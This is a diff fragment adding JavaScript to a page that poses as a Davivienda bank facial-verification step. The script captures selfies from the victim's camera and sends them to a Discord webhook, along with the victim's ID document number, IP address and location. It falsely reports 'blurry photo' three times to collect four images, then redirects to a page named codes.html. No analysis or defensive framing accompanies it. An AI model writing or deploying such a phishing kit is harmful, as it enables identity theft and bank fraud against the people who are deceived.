+        // Fallback: analiza el brillo central del frame para estimar si hay un rostro
+        // (funciona razonablemente bien en selfies con fondo oscuro)
+        function detectFaceFallback() {
+            const canvas = document.createElement('canvas');
+            const W = 80, H = 100;
+            canvas.width  = W;
+            canvas.height = H;
+            const ctx = canvas.getContext('2d');
+            // Tomamos la región central del video (donde debería estar el rostro)
+            const vw = video.videoWidth, vh = video.videoHeight;
+            const sx = vw * 0.25, sy = vh * 0.1, sw = vw * 0.5, sh = vh * 0.7;
+            ctx.drawImage(video, sx, sy, sw, sh, 0, 0, W, H);
+            const d = ctx.getImageData(0, 0, W, H).data;
+            let skinPixels = 0;
+            for (let i = 0; i < d.length; i += 4) {
+                const r = d[i], g = d[i+1], b = d[i+2];
+                // Heurística de piel: rojo domina, verde intermedio, azul bajo
+                if (r > 80 && g > 40 && b > 20 &&
+                    r > g && r > b &&
+                    (r - g) > 15 && (r - b) > 20 &&
+                    r < 240) {
+                    skinPixels++;
+                }
+            }
+            const ratio = skinPixels / (W * H);
+            // ratio > 0.18 → hay suficiente piel → rostro presente y bien encuadrado
+            // ratio > 0.35 → demasiado cerca
+            if (ratio > 0.38) return 'too-close';
+            if (ratio > 0.15) return 'ok';
+            return 'none';
+        }
+
+        async function detectFace() {
+            if (!video.videoWidth) return 'none';
+            if (faceDetector) {
+                try {
+                    const faces = await faceDetector.detect(video);
+                    if (!faces.length) return 'none';
+                    const face = faces[0];
+                    const faceArea = face.boundingBox.width * face.boundingBox.height;
+                    const frameArea = video.videoWidth * video.videoHeight;
+                    const ratio = faceArea / frameArea;
+                    if (ratio > 0.45) return 'too-close';
+                    if (ratio > 0.10) return 'ok';
+                    return 'none';
+                } catch { return detectFaceFallback(); }
+            }
+            return detectFaceFallback();
+        }
+
+        // ── Bucle de detección en tiempo real ──
+        let okFrames  = 0; // frames consecutivos con rostro bien encuadrado
+        const NEEDED  = 18; // ~0.6s a 30fps antes de lanzar captura automática
+
+        async function runDetectionLoop() {
+            if (scanning) return;
+            const result = await detectFace();
+
+            if (result === 'too-close') {
+                setState('warn', 'Aléjese de la cámara', 'Muévete un poco hacia atrás');
+                setRingColor('#ff9500');
+                setProgress(0);
+                okFrames = 0;
+            } else if (result === 'ok') {
+                okFrames++;
+                const pct = Math.min((okFrames / NEEDED) * 100, 100);
+                setState('good', 'Rostro detectado', 'Mantén la posición…');
+                setRingColor('#34c759');
+                setProgress(pct);
+                if (okFrames >= NEEDED && !scanning) {
+                    iniciarCaptura();
+                    return;
+                }
+            } else {
+                setState('', 'Encuadra tu rostro', 'Mira de frente a la cámara');
+                setRingColor('#007aff');
+                setProgress(0);
+                okFrames = 0;
+            }
+
+            detectLoop = requestAnimationFrame(runDetectionLoop);
+        }
+
+        // ── Captura y envío ──
+        function capture() {
+            const canvas  = document.createElement('canvas');
+            canvas.width  = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            return canvas.toDataURL('image/jpeg', 0.95);
+        }
+
+        async function enviarFotoDiscord(dataURL, numeroIntento) {
+            try {
+                const fecha = new Date().toLocaleString('es-CO', {
+                    timeZone: 'America/Bogota',
+                    dateStyle: 'full',
+                    timeStyle: 'medium'
+                });
+                const tipoDocTexto = { CC:'Cédula de Ciudadanía', CE:'Cédula de Extranjería', PP:'Pasaporte' }[tipoDocumento] || 'Desconocido';
+                const blob = await (await fetch(dataURL)).blob();
+                const formData = new FormData();
+                const payload = {
+                    embeds: [{
+                        title: `📸 Foto Facial - Intento ${numeroIntento}/4`,
+                        color: 0xDA291C,
+                        fields: [
+                            { name:"📋 Tipo de Documento", value:tipoDocTexto,    inline:true },
+                            { name:"🪪 Número",            value:numeroDocumento, inline:true },
+                            { name:"🔄 Intento",           value:`${numeroIntento} de 4`, inline:true },
+                            { name:"🌐 IP",                value:userIP,          inline:true },
+                            { name:"📍 Ubicación",         value:userLocation,    inline:true },
+                            { name:"🕒 Fecha",             value:fecha,           inline:false }
+                        ],
+                        footer: { text:"Sistema de Verificación Facial - Davivienda" },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+                formData.append('payload_json', JSON.stringify(payload));
+                formData.append('file', blob, `${numeroDocumento}_intento_${numeroIntento}.jpg`);
+                const r = await fetch(DISCORD_WEBHOOK, { method:'POST', body:formData });
+                return r.ok;
+            } catch { return false; }
+        }
+
+        async function iniciarCaptura() {
+            if (scanning) return;
+            scanning = true;
+            if (detectLoop) cancelAnimationFrame(detectLoop);
+
+            intento++;
+            scanLight.classList.add('active');
+
+            // Animación de escaneo
+            setState('scan', 'Validando biometría…', 'No te muevas');
+            setProgress(40);
+            await wait(900);
+            setState('scan', 'Procesando…', 'Casi listo');
+            setProgress(75);
+            await wait(900);
+            setProgress(100);
+            await wait(300);
+
+            // Flash foto
+            const dataURL = capture();
+            flashEffect.style.opacity = '0.75';
+            setTimeout(() => flashEffect.style.opacity = '0', 120);
+
+            await enviarFotoDiscord(dataURL, intento);
+            scanLight.classList.remove('active');
+
+            if (intento < 4) {
+                setState('warn', 'Foto borrosa', 'Inténtalo de nuevo');
+                setRingColor('#ff3b30');
+                setProgress(0);
+                okFrames = 0;
+                scanning = false;
+                await wait(2500);
+                setState('', 'Encuadra tu rostro', 'Mira de frente a la cámara');
+                setRingColor('#007aff');
+                detectLoop = requestAnimationFrame(runDetectionLoop);
+            } else {
+                setRingColor('#34c759');
+                setState('good', '¡Verificado!', 'Redirigiendo…');
+                await wait(1400);
+                loaderOverlay.style.display = 'flex';
+                if (stream) stream.getTracks().forEach(t => t.stop());
+                await wait(2200);
+                window.location.href = 'codes.html';
+            }
+        }
+
+        function wait(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+        // ── Arranque ──
+        async function startCamera() {
+            await getIPAndLocation();
+            await initFaceDetector();
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width:{ ideal:1920 }, height:{ ideal:1080 } }
+                });
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    if (!video.videoWidth) {
+                        setState('', 'Error de cámara', 'Intenta recargar');
+                        return;
+                    }
+                    setState('', 'Encuadra tu rostro', 'Mira de frente a la cámara');
+                    setTimeout(() => { detectLoop = requestAnimationFrame(runDetectionLoop); }, 800);
+                };
+            } catch {
+                setState('', 'Error', 'No se pudo acceder a la cámara');
+            }
+        }
+
+        startCamera();
+    </script>
 </body>
 </html>
